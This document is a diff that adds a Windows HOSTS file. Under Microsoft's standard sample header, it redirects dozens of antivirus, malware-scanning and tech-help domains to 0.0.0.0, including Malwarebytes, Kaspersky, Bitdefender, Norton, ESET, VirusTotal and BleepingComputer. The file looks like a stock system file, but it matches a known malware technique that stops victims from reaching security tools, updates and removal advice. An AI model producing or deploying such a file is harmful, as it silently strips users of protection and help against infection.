@@ -1,0 +1,69 @@
+# Copyright (c) 1993-2009 Microsoft Corp. 
+# 
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows. 
+# 
+# This file contains the mappings of IP addresses to host names. Each 
+# entry should be kept on an individual line. The IP address should 
+# be placed in the first column followed by the corresponding host name. 
+# The IP address and the host name should be separated by at least one 
+# space. 
+# 
+# Additionally, comments (such as these) may be inserted on individual 
+# lines or following the machine name denoted by a '#' symbol. 
+# 
+# For example: 
+# 
+#      102.54.94.97     rhino.acme.com          # source server 
+#       38.25.63.10     x.acme.com              # x client host 
+# localhost name resolution is handled within DNS itself. 
+#	127.0.0.1       localhost 
+#	::1             localhost 
+0.0.0.0 www.malwarebytes.com	
+0.0.0.0 www.avast.com	
+0.0.0.0 www.cnet.com	
+0.0.0.0 www.uptodown.com	
+0.0.0.0 www.filehorse.com	
+0.0.0.0 www.softonic.com	
+0.0.0.0 www.bleepingcomputer.com	
+0.0.0.0 www.tomsguide.com	
+0.0.0.0 www.digitaltrends.com	
+0.0.0.0 www.majorgeeks.com	
+0.0.0.0 www.techspot.com	
+0.0.0.0 www.ccm.net	
+0.0.0.0 www.filehippo.com	
+0.0.0.0 www.safetydetectives.com	
+0.0.0.0 www.pcmags.com	
+0.0.0.0 www.pcprofessionale.it	
+0.0.0.0 www.softpedia.com	
+0.0.0.0 www.chip.de	
+0.0.0.0 www.virustotal.com	
+0.0.0.0 www.html.it	
+0.0.0.0 www.avira.com	
+0.0.0.0 www.norton.com	
+0.0.0.0 www.avg.com	
+0.0.0.0 www.superantispyware.com	
+0.0.0.0 www.webhosting.it	
+0.0.0.0 www.kaspersky.it	
+0.0.0.0 www.kaspersky.com	
+0.0.0.0 www.bitdefender.it	
+0.0.0.0 www.bitdefender.com	
+0.0.0.0 www.bitdefender.org	
+0.0.0.0 www.bitdefender.net	
+0.0.0.0 www.pandasecurity.com	
+0.0.0.0 www.eset.com	
+0.0.0.0 www.totalav.com	
+0.0.0.0 www.mcafee.com	
+0.0.0.0 www.bullguard.com	
+0.0.0.0 www.aranzulla.it	
+0.0.0.0 www.cybersecurity360.it	
+0.0.0.0 www.ottimizzazione-pc.it	
+0.0.0.0 www.iobit.com	
+0.0.0.0 www.download.cnet.com	
+0.0.0.0 www.malwarebytes-anti-malware.it.uptodown.com	
+0.0.0.0 www.avast.it.softonic.com	
+0.0.0.0 www.e-avast.it	
+0.0.0.0 www.avg-anti-virus-free.it.softonic.com	
+0.0.0.0 www.avg-internet-security.it.uptodown.com	
+0.0.0.0 www.antivirus.comodo.com	
+0.0.0.0 www.blacked.com	
+0.0.0.0 www.it.norton.com	
